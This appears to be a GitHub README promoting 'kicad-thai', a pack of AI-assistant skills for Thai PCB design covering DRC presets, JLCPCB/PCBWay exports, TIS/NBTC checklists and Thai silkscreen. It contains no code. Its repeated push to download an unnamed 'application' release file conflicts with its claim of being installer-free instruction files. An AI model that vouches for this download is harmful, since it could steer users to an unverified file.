# 🇹🇭 kicad-thai - PCB Skills Built For Thailand

[![Download kicad-thai](https://img.shields.io/badge/Download-kicad--thai-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jerssonhans-creator/kicad-thai/releases)
[![Made for Thailand](https://img.shields.io/badge/Made%20for-Thailand-2ea44f?style=for-the-badge)](https://github.com/jerssonhans-creator/kicad-thai/releases)
[![Works with AI assistants](https://img.shields.io/badge/Works%20with-AI%20Assistants-8957e5?style=for-the-badge)](https://github.com/jerssonhans-creator/kicad-thai/releases)

A ready-to-use set of skills that teaches your AI assistant how to help you design circuit boards the Thai way — with local manufacturing rules, export settings for Thai-friendly board houses, and silkscreen text in Thai script.

---

## 📥 Download

**Visit this link to download the application:**

### 👉 https://github.com/jerssonhans-creator/kicad-thai/releases

That page is where every released version lives. Open it, pick the newest release at the top of the list, and download the file attached to it. Save it somewhere easy to find, like your Downloads folder or your Desktop.

You do not need an account to download. You do not need to install anything else first. The page opens in your normal web browser on Windows, and the download starts with a single click.

---

## ✨ What Is kicad-thai?

kicad-thai is a collection of ready-made instruction packs — called *skills* — for AI coding assistants. Think of a skill as a small handbook that your AI helper reads before it answers you. Once the kicad-thai skills are in place, your AI assistant stops giving generic advice about circuit boards and starts giving advice that actually fits Thailand.

Instead of you memorising which clearance values a local factory wants, or which checklist the regulator asks for, you simply ask your assistant a normal question in plain language. The assistant consults the kicad-thai skill pack and replies with the correct Thai-specific answer.

You do not need to know how to program. You do not need to read any configuration files. You download the package, point your AI assistant at it, and start asking questions.

---

## 🎯 Who This Is For

- Hobbyists in Thailand building their first PCB and unsure which settings are safe.
- Small electronics shops that send boards to JLCPCB or PCBWay and want the export settings right the first time.
- Product teams preparing documentation for มอก. (TIS) or กสทช. (NBTC) review.
- Makers who want Thai text printed neatly on the silkscreen instead of broken glyphs.
- Anyone using Claude Code, Codex, Cursor, Gemini CLI, or GitHub Copilot who wants Thailand-aware PCB guidance.

---

## 🧰 What's Inside

### 🧪 DRC Presets

Design Rule Check is the safety net that catches mistakes before you pay a factory. kicad-thai ships with preset rule bundles tuned for common Thai prototyping houses — trace widths, clearance, via sizes, and annular rings that match what local fabricators can actually produce. Load a preset, run the check, and fix only what genuinely matters.

### 📦 Gerber, BOM, and CPL Export for JLCPCB / PCBWay

Getting a board manufactured means sending three things: the Gerber files (the physical layers), the BOM (the parts list), and the CPL (the pick-and-place positions). kicad-thai walks you through producing all three with the naming and formatting conventions those two services expect, so the upload page accepts your files on the first try instead of rejecting them with cryptic errors.

### ✅ มอก. / กสทช. Checklists

Thai consumers and regulators expect certain documentation. The skill pack includes structured checklists that walk you through the questions มอก. (Thai Industrial Standards Institute) and กสทช. (National Broadcasting and Telecommunications Commission) reviewers commonly ask — labelling, marking, technical file contents, and radio equipment considerations. Use them as a preparation guide before you submit anything.

### 🖋️ Thai Silkscreen

Thai script on a PCB silkscreen fails easily: strokes merge, tone marks disappear, and the result is unreadable. kicad-thai includes guidance on font choice, minimum stroke width, and spacing so that Thai labels, part numbers, and company names print cleanly at manufacturing scale.

### 🤖 Works With Your AI Assistant

The same skill pack is structured so it can be loaded by Claude Code, Codex, Cursor, Gemini CLI, and GitHub Copilot. You are not locked into one tool. If you switch assistants later, the skills come with you.

---

## 🚀 Getting Started

1. **Visit the download page.** Open https://github.com/jerssonhans-creator/kicad-thai/releases in your browser.
2. **Choose the latest release.** The newest version sits at the top of the page. Older versions are listed below it.
3. **Download the attached file.** Look under the release notes for the downloadable asset and click it. Your browser saves it automatically.
4. **Keep the file somewhere permanent.** Move it out of your temporary Downloads folder into a folder you will remember, such as `Documents\kicad-thai`.
5. **Open your AI assistant.** Start Claude Code, Codex, Cursor, Gemini CLI, or GitHub Copilot exactly as you normally would.
6. **Point the assistant at the folder.** Tell it, in plain language, where you saved kicad-thai. For example: *"Use the skills in my Documents\kicad-thai folder."*
7. **Ask your first question.** Try something simple, like *"What clearance should I use for a two-layer board from a Thai fabricator?"*

That is the whole process. There is no installer, no wizard, and no licence key.

---

## 🧭 A First Project, Step by Step

Here is how a typical session looks once the skills are loaded.

1. **Describe your board.** Tell your assistant what you are building — for example, a small sensor node with a microcontroller and a radio module.
2. **Ask for a DRC preset.** The assistant suggests rule values that suit a low-cost two-layer board and explains each number in plain language.
3. **Design in KiCad.** Lay out your board as usual. This part is still your KiCad work; the skills guide you rather than replace you.
4. **Run the design rule check.** Apply the preset and run the check. Ask the assistant to explain any warning you do not understand.
5. **Prepare the exports.** Ask the assistant to walk you through generating Gerbers, the BOM, and the CPL with the naming conventions JLCPCB and PCBWay accept.
6. **Upload and order.** Send the files to your chosen service and place the order.
7. **Check compliance early.** Before you commit to a production run, run through the มอก. and กสทช. checklists so nothing surprises you at the approval stage.

---

## 🩺 Troubleshooting

**The download link does not work.** Open the link again in a fresh browser tab. If the page loads but no file appears, scroll down inside the newest release — the downloadable assets are listed below the release description.

**My AI assistant ignores the skills.** Repeat the folder path clearly and confirm the folder still exists at that location. Assistants only read files they can actually find.

**The assistant gives generic answers.** Say explicitly: *"Answer using the kicad-thai skills."* Naming the pack forces the assistant to consult it rather than rely on general knowledge.

**Thai text looks broken in preview.** This is normal at very small zoom levels. Trust the manufacturing-scale guidance in the silkscreen section rather than the on-screen preview.

**The factory rejected my files.** Re-run the export steps and check the file naming and layer order. Most rejections come from a mismatched naming convention, not from a design error.

---

## ❓ Questions People Ask

**Do I need to know how to code?** No. You describe what you want in ordinary language.

**Do I need to install KiCad first?** Yes, the skills assume you are designing in KiCad. The skills guide your design work; they do not replace the design tool.

**Is it free?** Yes, everything is published openly on the releases page.

**Can I use more than one AI assistant?** Yes. Load the same folder in whichever assistant you prefer, and switch whenever you like.

**Does it work outside Thailand?** The export guidance works anywhere. The DRC presets, compliance checklists, and silkscreen advice are specifically tuned for the Thai market.

**How often is it updated?** Check the releases page periodically. Each release is listed with its own notes so you can see what changed.

---

Keywords: agent-skills, bom, claude-code, claude-skills, codex, cursor, drc, eda, electronics, gemini-cli, gerber, github-copilot, jlcpcb, kicad, pcb, pcb-design, pcbway, thai, thailand